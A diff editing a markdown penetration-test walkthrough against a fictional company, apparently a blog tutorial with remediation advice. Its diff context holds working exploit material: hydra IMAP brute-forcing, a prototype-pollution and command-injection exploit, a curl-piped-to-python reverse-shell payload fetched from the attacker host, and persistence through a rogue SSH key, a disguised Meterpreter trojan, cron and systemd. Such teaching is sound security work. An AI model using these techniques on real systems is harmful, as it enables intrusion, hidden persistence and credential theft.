@@ -2,12 +2,18 @@
 
 This is the part one of series of articles bound to present a walkthrough leading to the compromise of domain controller of a fictional company called "Demo Corp", explaining the vulnerabilities along the way.
 
+Link to part two:  https://news.baycode.eu/0x04-lateral-movement/
+You can access the code on my GitHub: [https://github.com/krystianbajno](https://github.com/krystianbajno/articles).
+
+The **penetration test report** can be downloaded [here].
+
 **In this article, we will be focused on:**
-- Performing basic username gathering from the website
-- Brute forcing the IMAP e-mail service
-- Analyzing the found code and the vulnerabilities within it, then manufacturing a **0 day**, and using it to **gain access** to the initial pivot machine.
-- Maintaining persistence methods.
-- Gaining access to the domain.
+- [Performing basic username gathering from the website](#0x01 "- Performing basic username gathering from the website")
+- [Brute forcing the IMAP e-mail service](#0x02 "Brute forcing the IMAP e-mail service")
+- [Analyzing the found code and the vulnerabilities within it](#0x03 "Analyzing the found code and the vulnerabilities within it")
+- [Then manufacturing a **0 day**, and using it to **gain access** to the initial pivot machine.](0x04 "Then manufacturing a **0 day**, and using it to **gain access** to the initial pivot machine.")
+- [Maintaining persistence methods.](#0x06 "Maintaining persistence methods.")
+- [Gaining access to the domain.](#0x07 "Gaining access to the domain.")
 
 **To keep the simulation realistic to an ordinary penetration test, the Rules of Engagement are defined as:**
 - Phishing is prohibited
@@ -19,11 +25,23 @@ This is the part one of series of articles bound to present a walkthrough leadin
 - Information gathering on public facing infrastructure (https://democorp.webflow.io) is allowed.
 
 The layout of the infrastructure looks like on the following diagram:
+
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/diagram.png)
+
+<div id="0x01"></div>
+
+# 0x01 Reconnaissance
+
+<a href="#0x02"><button class="nav-btn">Next chapter</button></a>
+
 Let us start from visiting the website.
 https://democorp.webflow.io
 
 (All the personas are fictional, and their portraits were generated using self-hosted Stable Diffusion https://github.com/CompVis/stable-diffusion with Realistic Vision model. https://civitai.com/models/4201/realistic-vision-v20)
+
+## Username gathering
+
+What information can we gather from the website? Our prime target is "About" page.
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/1-1.png)
 
@@ -36,6 +54,7 @@ This is perfect from attacker perspective, as we can compose a potential usernam
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/55.png)
 
 At the end of the webpage we can see, that the webmaster's e-mail follows format
+
 ```
 f.lastname@company-domain
 ```
@@ -49,9 +68,10 @@ j.bird@democorp.com
 o.bloom@democorp.com
 ```
 
-On the penetration testing report, we would call it "Email addresses disclosure" and give it (Informational) priority. What is the** risk assessment** for that?
+On the penetration testing report, we would call it "Email addresses disclosure" and give it (Informational) priority. What is the **risk assessment** for that?
+## Risk assessment
 
-The **likelihood** is that the attackers can find this information from public faced services.
+The **likelihood** is that any attackers can find this information from public faced services.
 
 The **impact** is that the e-mail addresses discovered within the application can be used by both
 spam email engines and also brute-force tools. Furthermore, valid email
@@ -62,6 +82,8 @@ https://www.tenable.com/plugins/was/98078
 
 The recommendation for that is to not use the disclosed e-mail internally, replace the addresses with anonymous mailbox addresses, such as (webmaster@democorp.com), and provide the user awareness training to employees about disclosing private information publicly.
 
+## Network scanning
+
 Let's continue and gather information about the network.
 
 At first the most optimal approach is to scan for hosts, then for open ports, and then service scan the open ports. This saves a lot of time, as detailed scanning is consuming much more time, than simple port scans.
@@ -71,6 +93,7 @@ nmap -sS -T5 <hostname>
 ```
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/1-2.png)
+
 We can see, that the e-mail ports are open, so presumably, this is a mailbox server.
 
 ```
@@ -79,6 +102,11 @@ nmap -sV -sC -T5 -p <ports> <host>
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/2-1.png)
 
 Service and script scan reveals more information about the host, the operating system, and the versions of services running.
+
+<div id="0x02"></div>
+
+# 0x02 Brute forcing the IMAP service
+<a href="#0x01"><button class="nav-btn">Previous chapter</button></a><a href="#0x03"><button class="nav-btn">Next chapter</button></a>
 
 Let's compose a list of common passwords people use, when the password policy is insufficient.
 For example, let's start by being oriented around seasons, or company name. Why?
@@ -100,11 +128,14 @@ This includes factors such as alternative email addresses. It's important to rec
 To figure out whether your account information has been compromised in such a manner, you can utilize the following resource: [https://haveibeenpwned.com/](https://haveibeenpwned.com/)
 
 Let's move on to brute-forcing.
+
 ```
 hydra -L <user-list> <password-list> <host> <protocol> -I
 ```
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/4.png)
+
+## Password retrieved
 
 The user j.arnold@democorp.com had the password:
 ```
@@ -122,6 +153,7 @@ https://learn.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online
 The service was set up using default https://github.com/docker-mailserver/docker-mailserver installation. Despite the 11k star repo stating, that there is a Fail2ban mechanism, it was **not effective** by default. 
 
 IMAP falls short here, let's call it **Broken Authentication** and mark it as Critical. Let's move on to risk assessment.
+## Risk assessment
 
 **What is the likelihood?**
 The password was guessable, and the Multi Factor Authentication was ineffective.
@@ -132,9 +164,14 @@ Attacker gained access to the user's mailbox and was able to read the contents, 
 **Remediation** to that is to enforce a strong password policy and password management solutions, implement the MFA, and more modern authentication solution - for example OAuth like the Microsoft does. 
 
 Implementing monitoring solutions (SIEM, SOAR, HIDS, NIDS) to detect and alert on unauthorized access attempts, unusual authentication patterns, suspicious behavior related to password usage is recommended too. We could put it on the report, stating it is an "Undetected Malicious Behavior", and talk about it during the debrief.
+### What is a good password policy?
 
-**What is a good password policy?**
 Lower, uppercase letters, special characters, numbers, sentences, 15 characters or more – for administrator access – 30 characters or more. Sentences/Passphrases work best. Rotate the passwords monthly (although retired by NIST in favor of longer passwords, it is still a good thing to do, when you use a password management solution).
+
+<div id="0x03"></div>
+
+# 0x03 Information disclosure
+<a href="#0x02"><button class="nav-btn">Previous chapter</button></a><a href="#0x04"><button class="nav-btn">Next chapter</button></a>
 
 We gained access to the mailbox, now let's review the contents for unsecured credentials (https://attack.mitre.org/techniques/T1552/008/) or information disclosure (https://cwe.mitre.org/data/definitions/200.html) findings.
 
@@ -147,6 +184,9 @@ We just found a **Source Code Disclosure** ([link](https://portswigger.net/kb/is
 Let's download the source code and review it locally, and then craft a possible 0-day exploit.
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/1-4.png)
+
+## Source code disclosure
+
 After opening the source code, we are presented with a Node.js API application retrieving the current employee of the month.
 
 `index.js`
@@ -155,19 +195,26 @@ In the index.js, we can see, that there is a middleware for validation, JSON req
 
 `controllers/employee-of-the-month-controller.js`
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/43.png)
+
 We can see a couple of methods in the controller, `updateProfile` is updating the data for current employee of the month, and `refreshBadge` is regenerating the badge using ffmpeg command. Seems like the author had tried to keep it safe from command injection.
 
 `current-badge.png`
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/3232.png)
+
 The ffmpeg is creating a badge containing firstname and lastname of the employee of the month.
 
 `utils/utilities.js`
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/3213.png)
 The utilities.js contains two exported functions, one for deep merging the object, another one for sanitizing the possible command injection.
+### Based on that information, I will present two vulnerabilities. Let's start with less obvious one.
 
-## Based on that information, I will present two vulnerabilities. Let's start with less obvious one.
+<div id="0x04"></div>
+
+# 0x04 Prototype Pollution
+<a href="#0x03"><button class="nav-btn">Previous chapter</button></a><a href="#0x05"><button class="nav-btn">Next chapter</button></a>
+
 ![](http://news.baycode.eu/wp-content/uploads/2023/10/2qum0u.jpg)
-# Prototype Pollution
+
 Prototype pollution is a type of deserialization vulnerability that affects JavaScript application (server and client side) and other programming languages, such as Python. It occurs, when attacker manipulates the prototype (`__proto__`) of an object (let's say it is a template for other objects, which inherit the properties from the prototype), effectively poisoning it, the properties that did not exist on newly created objects now do exist. 
 
 The poisoning remains until the application is restarted, and can affect all components of the application, which could lead to a possible Denial of Service, which is why it is really dangerous if gone wrong.
@@ -202,15 +249,16 @@ exports.updateProfile = (req, res) => {
 	res.sendStatus(204)
 };
 ```
+
 The controller calls `merge` function in the updateProfile method.
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/8.png)
+
 The merge function is creating an object `{}`, and then unsafely merging the properties - iterating on everything, even `__proto__`, and assigning it inside, effectively polluting every newly created object in the application. This example is based on a real world library available in the npm repository that I found (https://github.com/mvoorberg/x-assign), all it takes to pollute your application is one invocation of this function with a payload, so if you use it -  immediate removal is advised. 
 
 There are many libraries in the npm repository that contain prototype pollution vulnerabilities, always keep in mind the supply chain. Here is an example blog post describing the issue (https://medium.com/intrinsic-blog/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96).
 
 If you make a `for each` on the source object, and then assign everything that was iterated on it, you will pollute the object.
-
 ## What is the gadget in the current context?
 The combined gadget that leads to Remote Code Execution is `execSync` function from `/refresh/badge` endpoint.
 
@@ -252,7 +300,7 @@ For more information about prototype pollution, please visit:
 https://portswigger.net/web-security/prototype-pollution/server-side
 https://www.veracode.com/blog/secure-development/yet-another-perspective-prototype-pollution
 
-# So now that we know what prototype pollution is, let's run the application locally, and craft an exploit.
+## So now that we know what prototype pollution is, let's run the application locally, and craft an exploit.
 
 Application is running, To proceed, we'll copy the JSON into our exploit and test for pollution.
 
@@ -294,7 +342,6 @@ res = client.get(
 print(res, res.text)
 ```
 
-
 Let's check for the results.
 ```
 [Object: null prototype] {
@@ -302,9 +349,12 @@ Let's check for the results.
   hello: 'from pollution'
 }
 ```
+
 We have successfully executed prototype pollution.
 
-Moving forward, we'll continue with poisoning the prototype env, and requiring the /proc/self/environ file, executing the payload using argv0 = `/proc/self/exe` (node) the next time `execSync` executes. Our payload for now will be `touch /dev/shm/pollution`, creating a file in the device RAM. If the file exists after our exploitation, then we would have achieved Remote Code Execution.
+## Weaponization
+
+Moving forward, we'll continue with poisoning the prototype env, and requiring the `/proc/self/environ` file, executing the payload using argv0 = `/proc/self/exe` (node) the next time `execSync` executes. Our payload for now will be `touch /dev/shm/pollution`, creating a file in the device RAM. If the file exists after our exploitation, then we would have achieved Remote Code Execution.
 
 ```
   "__proto__": {
@@ -339,6 +389,8 @@ Let's create a real payload now.
 (curl http://localhost:8000/reverse_shell.py | python3) &
 ```
 The above payload will download the reverse shell from our machine and pipe it into the python interpreter, executing the payload in memory.
+
+## Exploitation
 
 I've chosen to go with the python reverse shell from [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md "github").
 
@@ -387,19 +439,20 @@ python3 -m http.server
 ```
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/32323.png)
+
 ## Boom, we received a reverse shell.
 
 Unfortunately, we can not use this critical exploit, despite potential bad guys being more than happy to. It is only for reporting purposes. Do you remember beginning of the article and Rules of Engagement? No Denial of Service is allowed, and running this exploit would render `/employee-of-the-month/badge/refresh` unusable until restart of the application.
+
 ## How can I prevent prototype pollution?
 
-## Sanitize
+### Sanitize
 One approach to mitigate prototype pollution vulnerabilities involves sanitizing property keys before merging them into existing objects. This precautionary measure helps to stop attackers from injecting keys like "**proto**," which can manipulate the object's prototype.
 
 While the ideal method is to employ an **allowlist** of approved keys, it may not always be practical. In such cases, a commonly used alternative is to employ a **denylist** strategy, where potentially harmful strings from user input are removed.
 
 However, it's important to note that relying solely on blocklisting has limitations. Some websites may successfully block "**proto**" but still overlook vulnerabilities that arise when an attacker manipulates an object's prototype through its constructor. Additionally, weak blocklisting implementations can be circumvented using straightforward obfuscation techniques such as `__pro__proto__to__`. The sanitization removes `__proto__` from `__pro__proto__to__`, and leaves the output as `__proto__`. For this reason, **blacklisting is recommended as a temporary measure rather than a long-term solution**.
-
-## Safeguard prototype objects
+### Safeguard prototype objects
 A more resilient strategy for mitigating prototype pollution vulnerabilities involves safeguarding prototype objects against any alterations.
 
 By employing the Object.freeze() method on an object, you effectively lock down its properties and values, rendering them immutable and preventing the addition of new properties. Since prototypes are essentially objects, you can proactively safeguard against potential vulnerabilities like so:
@@ -407,8 +460,7 @@ By employing the Object.freeze() method on an object, you effectively lock down 
 `Object.freeze(Object.prototype);`
 
 Alternatively, you can consider using the Object.seal() method, which allows changes to existing property values while still restricting the addition of new properties. This approach can serve as a viable compromise when using Object.freeze() is not feasible for certain reasons.
-
-## Eliminate gadgets
+### Eliminate gadgets
 In addition to using Object.freeze() to mitigate potential prototype pollution sources, you can also implement measures to neutralize potential gadgets. By doing so, even if an attacker identifies a prototype pollution vulnerability, it is likely to be rendered non-exploitable.
 
 By default, all objects inherit from the global Object.prototype, either directly or indirectly through the prototype chain. However, you have the option to manually set an object's prototype using the Object.create() method. This not only enables you to designate any object as the new object's prototype but also allows you to create the object with a null prototype. This null prototype ensures that the object won't inherit any properties whatsoever:
@@ -426,9 +478,15 @@ Object.getPrototypeOf(object); // null
 ```
 
 By employing this technique, you effectively isolate your objects from the global prototype chain, reducing the risk of prototype pollution vulnerabilities and enhancing the security of your code.
+
 ## So if this exploit is prohibited, then how do we pop the shell?
+
 Let me show you another vulnerability that was found here.
-# Command injection
+
+<div id="0x05"></div>
+# 0x05 Command injection
+<a href="#0x04"><button class="nav-btn">Previous chapter</button></a><a href="#0x06"><button class="nav-btn">Next chapter</button></a>
+
 Command injection? Wasn't that sanitized? Yes, but the developer employed a blocklist and thought so too, but overlooked the possible syntax.
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/2-2.png)
@@ -447,6 +505,8 @@ payloadStageTwo = "$(python3 /dev/shm/shell.py)"
 ```
 
 Let's poison the last name of our employee of the month, refresh the badge, and inject the command.
+
+## Exploitation
 
 ```python
 import httpx
@@ -520,10 +580,15 @@ Never attempt to sanitize input by escaping shell metacharacters. In practice, t
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/1-6.png)
 
 After running the exploit, we've compromised the first machine. This machine is going to be our pivot into the internal domain. The important thing to do now, is to establish persistence, so we are not too easy to get shaken off of the machine.
-# Persistence is key
+
+<div id="0x06"></div>
+
+# 0x06 Persistence is key
+<a href="#0x05"><button class="nav-btn">Previous chapter</button></a><a href="#0x07"><button class="nav-btn">Next chapter</button></a>
 
 Our next step is to create a rogue SSH key for persistence.
 
+## Persistence via backdoored SSH service
 ```
 ssh-keygen
 ```
@@ -546,6 +611,8 @@ rm .ssh/id_rsa .ssh/id_rsa.pub
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/4-2.png)
 
+## Persistence via malware
+
 Additionally to backdooring the SSH service, let's create a Meterpreter payload and upload it into the machine. The payload should be named in a way so it is innocent looking.
 
 ```
@@ -554,6 +621,8 @@ scp -i <key> <file> <user>@<ip>:
 ```
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/5-1.png)
+
+## Crontab
 
 Moving forward, we'll create the .config/.node directory, copy the executable into there and change the permissions to make it executable.
 ```
@@ -570,6 +639,8 @@ crontab -e
 0 8 * * * /home/node-api/.config/.node/node-builder
 ```
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/7-1.png)
+
+## User Service
 
 Let's add another way of executing the trojan - create a user service. On Linux running systemd, we can create a directory '.config/systemd/user', save services in there, and then enable them.
 
@@ -610,7 +681,12 @@ exploit
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/9.png)
 
 The backdoor works. Our next step is to make our way into the internal domain.
-# Into the domain
+
+<div id="0x07"></div>
+
+# 0x07 Into the domain
+
+<a href="#0x06"><button class="nav-btn">Previous chapter</button></a><a href="#0x08"><button class="nav-btn">Next chapter</button></a>
 
 After establishing persistence, lets check what other networks the mail server has defined routes to.
 
@@ -620,6 +696,8 @@ ip route
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/10.png)
 
+## Pivoting
+
 As we can see, there is 10.10.24.0/24 network available. Let's continue with pivoting into the network using `sshuttle`. SSHuttle (https://github.com/sshuttle/sshuttle) is a transparent proxy utility that forwards the multiplexed packets in a data-over-TCP pattern into the internal network over SSH tunnel transport, and routes packets through defined CIDR using `iptables` firewall , it is seamless, and there is no need for `proxychains`.
 
 ```
@@ -627,6 +705,8 @@ sshuttle -r user@ip <network CIDR> --ssh-cmd "ssh -i <key>" -v
 ```
 
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/11.png)
+
+## Port scanning
 
 After establishing the pivot, our next step is to upload a port scanner onto the mail server and scan the network. This way it is faster than sending the packets through the pivot box.
 
@@ -641,6 +721,7 @@ For port scanning I decided to go with a compiled NimScan (https://github.com/el
 ```
 ./scan 10.10.24.0/24 -p:445,139,135,3389,5357,389,636
 ```
+
 **135** - Microsoft RPC port, which can be used to create services, modify registry by utilizing SCM and DCOM objects, and read information about the computer / domain.
 
 **139** - Port used for NetBIOS communication, specific for Windows. SMB communication can also happen over this port (SMB over NetBIOS).
@@ -667,6 +748,7 @@ ldapsearch -LLL -x -H ldap://10.10.24.250 -b '' -s base '(objectclass=*)'
 ![](http://news.baycode.eu/wp-content/uploads/2023/09/15a.png)
 
 We discovered the Domain Controller - `10.10.24.250` - democorp-dc@democorp.com. It is time to gather information about users.
+
 ## Kerberos
 
 Another important port not included in the scan is port **88**, which is **Kerberos**. It is an alternative network authentication protocol to NTLM over SMB. Despite being created in 1988 by MIT, it was released for Windows 2000 12 years later. It is more secure, but has some defects, for example exploitation of the pre-auth mechanism, which allows for user enumeration, Kerberoasting, and AS-REP roasting attacks when configured badly. It is possible to execute delegation attacks, craft tickets and impersonate other/not existing users. 
@@ -702,7 +784,9 @@ crackmapexec smb -u <user> -p <password> -d <domain> <hosts>
 ## Access granted
 
 The credentials were valid. Although the user was not an administrator on any of the machines, and we couldn't pop a shell just yet, we gained access to the domain, and opened a vector for many attacks and domain enumeration. The password reuse is a finding we should put on our report and mark it as critical. (MITRE: https://attack.mitre.org/techniques/T1078/002/)
+
 ## What is password reuse?
+
 Despite minimally touching the surface of the subject in the beginning of the article, it is important emphasize it's importance.
 
 Password reuse refers to the practice of using the same password across multiple accounts or systems. This means that individuals use the same password for different services, such as email accounts, social media platforms, online banking, and work-related systems. 
@@ -719,13 +803,35 @@ Very high – The likelihood is very high if insufficient passwords are widespre
 High – In this case the impact is high, as we only gained access to the domain. The impact would be very high if compromised accounts had administrative privileges, access to highly sensitive systems or data, or if the attack would lead to significant disruption of services.
 
 ## What is the remediation?
+
 - Provide user awareness training on password security best practices, emphasizing the importance of creating unique and strong passwords, avoiding password reuse.
 - Implement a password managing solution, which will create strong passwords.
 - Enforce strong password policies, and encourage good password practices. These were described in the beginning of the article, but as the article is quite long - let's talk about it again.
 
 **What is a good password policy?**
 Lower, uppercase letters, special characters, numbers, sentences, 15 characters or more – for administrator access – 30 characters or more. Sentences/Passphrases work best. Rotate the passwords monthly (although retired by NIST in favor of longer passwords, it is still a good thing to do, when you use password management solution).
-## To be continued
+
+<div id="0x08"></div>
+
+# 0x08 To be continued
+<a href="#0x07"><button class="nav-btn">Previous chapter</button></a>
 
 We've reached the end of part one, where we talked about gaining access to the domain. Now, in the next part, we're going to explore what happens when someone tries to take control of the Active Directory network. We'll look at how these attacks happen and why it's crucial to protect the network.
+
+Link to part two:  https://news.baycode.eu/0x04-lateral-movement/
+
 ### Stay safe!
+
+<style>
+.nav-btn {
+ cursor: pointer;
+ display: inline-block;
+ margin-right: 16px;
+ font-weight: 800;
+ color: white;
+ background-color: #14C096;
+ border-radius: 4px;
+ border: 0px;
+ padding: 8px;
+}
+</style>
